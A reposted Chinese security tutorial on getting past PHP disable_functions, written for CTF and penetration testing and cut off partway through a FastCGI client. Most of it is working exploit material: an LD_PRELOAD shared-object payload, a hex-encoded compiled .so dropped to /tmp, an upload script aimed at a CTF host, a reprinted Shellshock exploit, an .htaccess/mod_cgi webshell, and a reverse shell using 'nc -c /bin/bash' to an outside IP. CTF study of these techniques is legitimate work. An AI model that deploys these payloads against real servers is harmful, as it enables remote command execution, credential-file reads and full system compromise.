> 原文链接: https://www.anquanke.com//post/id/208451 


# bypass disable_function多种方法+实例


                                阅读量   
                                **271057**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01e14902014fb6f7e0.jpg)](https://p5.ssl.qhimg.com/t01e14902014fb6f7e0.jpg)



作者：ch3ng@星盟

## 前言

在做CTF题目或者是在渗透的过程中常常会遇到已经拿到了webshell但是却无法执行命令，主要原因是由于常用的函数例如：system()等被禁用

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018618cb78c6cbc654.png)



## LD_PRELOAD

LD_PRELOAD是linux下的一个环境变量，可以影响程序运行时的链接过程，被指定路径的文件会在其它文件被调用点，最先调用

一个测试mail.php

```
&lt;?php
mail('','','','');
?&gt;
```

查看其运行时启动的子进程

```
strace -f php mail.php 2&gt;&amp;1 | grep execve

execve("/usr/bin/php", ["php", "mail.php"], 0x7ffdd5194ee0 /* 23 vars */) = 0
[pid  9707] execve("/bin/sh", ["sh", "-c", "/usr/sbin/sendmail -t -i "], 0x5597ba716e70 /* 23 vars */) = 0
[pid  9708] execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-t", "-i"], 0x5586f66f9bd0 /* 23 vars */) = 0
```

查看sendmail使用了哪些函数

```
readelf -s /usr/sbin/sendmail
```

[![](https://p2.ssl.qhimg.com/t015b563847b0743db5.png)](https://p2.ssl.qhimg.com/t015b563847b0743db5.png)

这里使用getuid，编写so文件test.c

```
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
void payload()`{`
        system("whoami &gt; /tmp/Ch3ng");
`}`
int getuid()
`{`
        if(getenv("LD_PRELOAD")==NULL)`{` return 0;`}`
        unsetenv("LD_PRELOAD");
        payload();
`}`
```

编译生成

```
gcc -c -fPIC test.c -o hack &amp;&amp; gcc --share hack -o hack.so
```

接着php使用：

```
&lt;?php
putenv("LD_PRELOAD=./hack.so");
mail('','','','');
?&gt;
```

即可发现/tmp多了个Ch3ng文件

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f243ab53cf4614f5.png)

例题：<br>
题目源码：

```
&lt;?php
@eval($_REQUEST['ant']);
show_source(__FILE__);
?&gt;
```

查看phpinfo()，发现disable_function有很多禁用函数

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system
```

蚁剑连接上去，将bypass_disablefunc.php与bypass_disablefunc_x64.so上传上去，但是由于这里禁用了mail函数，所以这里使用error_log来触发

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01687c396af3e345a5.png)

[![](https://p3.ssl.qhimg.com/t01ccab691a620aab03.png)](https://p3.ssl.qhimg.com/t01ccab691a620aab03.png)

最后执行

```
bypass_disablefunc.php?cmd=/readflag&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so
```

即可获得flag

或者直接在利用php执行：

```
file_put_contents('/tmp/1.so',pack('H*','7f454c4602010100000000000000000003003e0001000000c006000000000000400000000000000028140000000000000000000040003800060040001c001900010000000500000000000000000000000000000000000000000000000000000004090000000000000409000000000000000020000000000001000000060000000809000000000000080920000000000008092000000000005802000000000000600200000000000000002000000000000200000006000000280900000000000028092000000000002809200000000000c001000000000000c0010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050e57464040000008408000000000000840800000000000084080000000000001c000000000000001c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000040000001400000003000000474e550066bb9e247f3731670b5cdfd534ac53233e576aef00000000030000000d000000010000000600000088c22001001440090d0000000f000000110000004245d5ecbbe3927cd871581cb98df10eead3ef0e6d1287c2000000000000000000000000000000000000000000000000000000000000000003000900380600000000000000000000000000007d00000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008b00000012000000000000000000000000000000000000009d00000021000000000000000000000000000000000000000100000020000000000000000000000000000000000000009e00000011000000000000000000000000000000000000006100000020000000000000000000000000000000000000009c0000001100000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000840000001200000000000000000000000000000000000000a600000010001600600b2000000000000000000000000000b900000010001700680b2000000000000000000000000000ad00000010001700600b20000000000000000000000000001000000012000900380600000000000000000000000000001600000012000c00600800000000000000000000000000007500000012000b00c0070000000000009d00000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007072656c6f616400676574656e76007374727374720073797374656d006c6962632e736f2e36005f5f656e7669726f6e005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200000002000200000002000000020000000200020001000100010001000100010001000100920000001000000000000000751a690900000200be00000000000000080920000000000008000000000000009007000000000000180920000000000008000000000000005007000000000000580b2000000000000800000000000000580b200000000000100920000000000001000000120000000000000000000000e80a20000000000006000000030000000000000000000000f00a20000000000006000000060000000000000000000000f80a20000000000006000000070000000000000000000000000b20000000000006000000080000000000000000000000080b200000000000060000000a0000000000000000000000100b200000000000060000000b0000000000000000000000300b20000000000007000000020000000000000000000000380b20000000000007000000040000000000000000000000400b20000000000007000000060000000000000000000000480b200000000000070000000b0000000000000000000000500b200000000000070000000c00000000000000000000004883ec08488b05ad0420004885c07405e8430000004883c408c30000000000000000000000000000ff35ba042000ff25bc0420000f1f4000ff25ba0420006800000000e9e0ffffffff25b20420006801000000e9d0ffffffff25aa0420006802000000e9c0ffffffff25a20420006803000000e9b0ffffffff259a0420006804000000e9a0ffffff488d3d99042000488d0599042000554829f84889e54883f80e7615488b05060420004885c074095dffe0660f1f4400005dc366666666662e0f1f840000000000488d3d59042000488d3552042000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05d90320004885c0740c5dffe0660f1f8400000000005dc366666666662e0f1f840000000000803d0904200000752748833daf03200000554889e5740c488b3dea032000e82dffffffe848ffffff5dc605e003200001f3c366666666662e0f1f840000000000488d3d8901200048833f00750be95effffff660f1f440000488b05510320004885c074e9554889e5ffd05de940ffffff554889e54883ec10488d3d9a000000e89cfeffff488945f0c745fc00000000eb4f488b0510032000488b008b55fc4863d248c1e2034801d0488b00488d35740000004889c7e8a6feffff4885c0741d488b05e2022000488b008b55fc4863d248c1e2034801d0488b00c600008345fc01488b05c1022000488b008b55fc4863d248c1e2034801d0488b004885c07592488b45f04889c7e825feffffc9c30000004883ec084883c408c34556494c5f434d444c494e45004c445f5052454c4f414400000000011b033b1800000002000000dcfdffff340000003cffffff5c0000001400000000000000017a5200017810011b0c070890010000240000001c000000a0fdffff60000000000e10460e184a0f0b770880003f1a3b2a332422000000001c00000044000000d8feffff9d00000000410e108602430d0602980c0708000000000000000000009007000000000000000000000000000050070000000000000000000000000000010000000000000092000000000000000c0000000000000038060000000000000d000000000000006008000000000000190000000000000008092000000000001b0000000000000010000000000000001a0000000000000018092000000000001c000000000000000800000000000000f5feff6f00000000b8010000000000000500000000000000c0030000000000000600000000000000f8010000000000000a00000000000000ca000000000000000b0000000000000018000000000000000300000000000000180b20000000000002000000000000007800000000000000140000000000000007000000000000001700000000000000c0050000000000000700000000000000d0040000000000000800000000000000f00000000000000009000000000000001800000000000000feffff6f00000000b004000000000000ffffff6f000000000100000000000000f0ffff6f000000008a04000000000000f9ffff6f0000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000280920000000000000000000000000000000000000000000760600000000000086060000000000009606000000000000a606000000000000b606000000000000580b2000000000004743433a202844656269616e20342e392e322d31302b6465623875322920342e392e3200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e740000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200b80100000000000000000000000000000000000003000300f80100000000000000000000000000000000000003000400c003000000000000000000000000000000000000030005008a0400000000000000000000000000000000000003000600b00400000000000000000000000000000000000003000700d00400000000000000000000000000000000000003000800c00500000000000000000000000000000000000003000900380600000000000000000000000000000000000003000a00600600000000000000000000000000000000000003000b00c00600000000000000000000000000000000000003000c00600800000000000000000000000000000000000003000d00690800000000000000000000000000000000000003000e00840800000000000000000000000000000000000003000f00a00800000000000000000000000000000000000003001000080920000000000000000000000000000000000003001100180920000000000000000000000000000000000003001200200920000000000000000000000000000000000003001300280920000000000000000000000000000000000003001400e80a20000000000000000000000000000000000003001500180b20000000000000000000000000000000000003001600580b20000000000000000000000000000000000003001700600b2000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001200200920000000000000000000000000001900000002000b00c00600000000000000000000000000002e00000002000b00000700000000000000000000000000004100000002000b00500700000000000000000000000000005700000001001700600b20000000000001000000000000006600000001001100180920000000000000000000000000008d00000002000b0090070000000000000000000000000000990000000100100008092000000000000000000000000000b80000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000cd00000001000f0000090000000000000000000000000000db0000000100120020092000000000000000000000000000000000000400f1ff00000000000000000000000000000000e700000001001600580b2000000000000000000000000000f40000000100130028092000000000000000000000000000fd00000001001600600b20000000000000000000000000000901000001001500180b20000000000000000000000000001f01000012000000000000000000000000000000000000003301000020000000000000000000000000000000000000004f01000010001600600b20000000000000000000000000005601000012000c00600800000000000000000000000000005c01000012000000000000000000000000000000000000007001000020000000000000000000000000000000000000007f01000011000000000000000000000000000000000000009401000010001700680b20000000000000000000000000009901000010001700600b2000000000000000000000000000a501000012000b00c0070000000000009d00000000000000ad0100002000000000000000000000000000000000000000c10100001100000000000000000000000000000000000000d80100002000000000000000000000000000000000000000f201000022000000000000000000000000000000000000000e02000012000900380600000000000000000000000000001402000012000000000000000000000000000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e65730072656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e36363730005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006279706173735f64697361626c6566756e632e63005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65005f6564617461005f66696e690073797374656d4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f00656e7669726f6e4040474c4942435f322e322e35005f656e64005f5f6273735f7374617274007072656c6f6164005f4a765f5265676973746572436c6173736573005f5f656e7669726f6e4040474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e6974007374727374724040474c4942435f322e322e3500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000b801000000000000b8010000000000003c00000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000f801000000000000f801000000000000c80100000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000c003000000000000c003000000000000ca0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f02000000000000008a040000000000008a04000000000000260000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000b004000000000000b004000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000d004000000000000d004000000000000f0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000c005000000000000c0050000000000007800000000000000030000000a0000000800000000000000180000000000000078000000010000000600000000000000380600000000000038060000000000001a00000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000006006000000000000600600000000000060000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c006000000000000c0060000000000009d01000000000000000000000000000010000000000000000000000000000000840000000100000006000000000000006008000000000000600800000000000009000000000000000000000000000000040000000000000000000000000000008a00000001000000020000000000000069080000000000006908000000000000180000000000000000000000000000000100000000000000000000000000000092000000010000000200000000000000840800000000000084080000000000001c00000000000000000000000000000004000000000000000000000000000000a0000000010000000200000000000000a008000000000000a0080000000000006400000000000000000000000000000008000000000000000000000000000000aa0000000e0000000300000000000000080920000000000008090000000000001000000000000000000000000000000008000000000000000000000000000000b60000000f0000000300000000000000180920000000000018090000000000000800000000000000000000000000000008000000000000000000000000000000c2000000010000000300000000000000200920000000000020090000000000000800000000000000000000000000000008000000000000000000000000000000c700000006000000030000000000000028092000000000002809000000000000c001000000000000040000000000000008000000000000001000000000000000d0000000010000000300000000000000e80a200000000000e80a0000000000003000000000000000000000000000000008000000000000000800000000000000d5000000010000000300000000000000180b200000000000180b0000000000004000000000000000000000000000000008000000000000000800000000000000de000000010000000300000000000000580b200000000000580b0000000000000800000000000000000000000000000008000000000000000000000000000000e4000000080000000300000000000000600b200000000000600b0000000000000800000000000000000000000000000001000000000000000000000000000000e90000000100000030000000000000000000000000000000600b0000000000002400000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000840b000000000000f200000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000780c00000000000088050000000000001b0000002b0000000800000000000000180000000000000009000000030000000000000000000000000000000000000000120000000000002802000000000000000000000000000001000000000000000000000000000000'));putenv("EVIL_CMDLINE=/readflag &gt; /tmp/flag.txt");putenv("LD_PRELOAD=/tmp/1.so");error_log("",1);readfile('/tmp/flag.txt');
```

或者利用python脚本上传执行：

```
import requests

url = "http://f7eb61fe-d260-451c-a9b2-37bd2cd37bcf.node3.buuoj.cn/?Ginkgo=ZXZhbCgkX1BPU1RbJ2EnXSk7"

data = `{`
    "a":"move_uploaded_file($_FILES['file']['tmp_name'],'/tmp/1.so');putenv('EVIL_CMDLINE=/readflag &gt; /tmp/flag.txt');putenv('LD_PRELOAD=/tmp/1.so');error_log('',1);readfile('/tmp/flag.txt');"
`}`

file = `{`'file':open('1.so','rb')`}`
r = requests.post(url=url,files=file,data=data)
print r.content
```



## ShellShock

利用bash破壳漏洞（CVE-2014-6271），该漏洞存在于bash 1.14 – 4.3版本中<br>[https://www.cnblogs.com/qmfsun/p/7591757.html](https://www.cnblogs.com/qmfsun/p/7591757.html)

导致漏洞出问题是以“()`{`”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令<br>
利用的PHP代码：

```
&lt;?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) `{` // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() `{` x; `}`; $cmd &gt;$tmp 2&gt;&amp;1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   //mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   error_log('a',1);
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
`}` 
echo shellshock($_REQUEST["cmd"]); 
?&gt;
```

上传脚本运行得到flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e080aa8c638fb735.png)



## Apache Mod CGI

禁用函数如下：

```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
```

比之前多禁用了putenv

这次使用的方法是利用.htaccess，我们通过上传.htaccess来利用apache的mod_cgi来绕过php的限制，这个利用方法在De1CTF checkin出现过<br>
利用条件：
- 目录下有写权限
- apache 使用 apache_mod_php
- Web 目录给了 AllowOverride 权限
- 启用了mod_cgi
首先上传.htaccess

```
Options +ExecCGI
AddHandler cgi-script .test
```

之后上传shell.test

```
#!/bin/bash
echo&amp;&amp;cat /etc/passwd
```

然后访问shell.test

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aa41a47f3a3e666d.png)

也可以直接上传，访问之后反弹shell

```
&lt;?php
$cmd = "nc -c '/bin/bash' xxx.xx.xx.xx 4444"; //command to be executed
$shellfile = "#!/bin/bashn"; //using a shellscript
$shellfile .= "echo -ne "Content-Type: text/html\n\n"n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
`{`
    echo "$text: " . ($condition ? $yes : $no) . "&lt;br&gt;n";
`}`
if (!isset($_GET['checked']))
`{`
    @file_put_contents('.htaccess', "nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
`}`
else
`{`
    $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
    $writable = is_writable('.'); //current dir writable?
    $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
        checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
        checkEnabled("Is writable",$writable,"Yes","No");
        checkEnabled("htaccess working",$htaccess,"Yes","No");
    if(!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))
    `{`
        echo "Error. All of the above must be true for the script to work!"; //abort if not
    `}`
    else
    `{`
        checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
        checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGInAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
        checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
        checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
        echo "Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;"; //call the script
    `}`
`}`
?&gt;
```



## PHP-FPM

php-fpm是PHP内置的一种fast-cgi

> <p>php-fpm即php-Fastcgi Process Manager.<br>
php-fpm是 FastCGI 的实现，并提供了进程管理的功能。<br>
进程包含 master 进程和 worker 进程两种进程。<br>
master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，<br>
每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p>

[![](https://p5.ssl.qhimg.com/t01a1c04507f48d1137.png)](https://p5.ssl.qhimg.com/t01a1c04507f48d1137.png)

与php-fpm通信有两种模式，一种为TCP，一种为Unix Socket，这里以TCP为例，构造fastcgi协议与fpm通信， 开启PHP_ADMIN_VALUE来加载恶意的.so

```
&lt;?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt; 
 * @version     1.0
 */
class FCGIClient
`{`
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    `{`
        $this-&gt;_host = $host;
        $this-&gt;_port = $port;
    `}`
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    `{`
        $this-&gt;_keepAlive = (boolean)$b;
        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) `{`
            fclose($this-&gt;_sock);
        `}`
    `}`
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    `{`
        return $this-&gt;_keepAlive;
    `}`
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    `{`
        if (!$this-&gt;_sock) `{`
            $this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
            if (!$this-&gt;_sock) `{`
                throw new Exception('Unable to connect to FastCGI application');
            `}`
        `}`
    `}`
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    `{`
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
            . chr($requestId &amp; 0xFF)        /* requestIdB0 */
            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    `}`
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    `{`
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen &lt; 128) `{`
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        `}` else `{`
            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
        `}`
        if ($vlen &lt; 128) `{`
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        `}` else `{`
            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
        `}`
        /* nameData &amp; valueData */
        return $nvpair . $name . $value;
    `}`

    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    `{`
        $ret = array();
        $ret['version']       = ord($data`{`0`}`);
        $ret['type']          = ord($data`{`1`}`);
        $ret['requestId']     = (ord($data`{`2`}`) &lt;&lt; 8) + ord($data`{`3`}`);
        $ret['contentLength'] = (ord($data`{`4`}`) &lt;&lt; 8) + ord($data`{`5`}`);
        $ret['paddingLength'] = ord($data`{`6`}`);
        $ret['reserved']      = ord($data`{`7`}`);
        return $ret;
    `}`
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    `{`
        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) `{`
            $resp = $this-&gt;decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) `{`
                $len  = $resp['contentLength'];
                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) `{`
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                `}`
            `}`
            if ($resp['paddingLength']) `{`
                $buf=fread($this-&gt;_sock, $resp['paddingLength']);
            `}`
            return $resp;
        `}` else `{`
            return false;
        `}`
    `}`

    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    `{`
        $response = '';
        $this-&gt;connect();
        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key =&gt; $value) `{`
            $paramsRequest .= $this-&gt;buildNvpair($key, $value);
        `}`
        if ($paramsRequest) `{`
            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
        `}`
        $request .= $this-&gt;buildPacket(self::PARAMS, '');
        if ($stdin) `{`
            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);
        `}`
        $request .= $this-&gt;buildPacket(self::STDIN, '');
        fwrite($this-&gt;_sock, $request);
        do `{`
            $resp = $this-&gt;readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) `{`
                $response .= $resp['content'];
            `}`
        `}` while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);
        if (!is_array($resp)) `{`
            throw new Exception('Bad request');
        `}`
        switch (ord($resp['content']`{`4`}`)) `{`
            case self::CANT_MPX_CONN:
                throw new Exception('This app can't multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
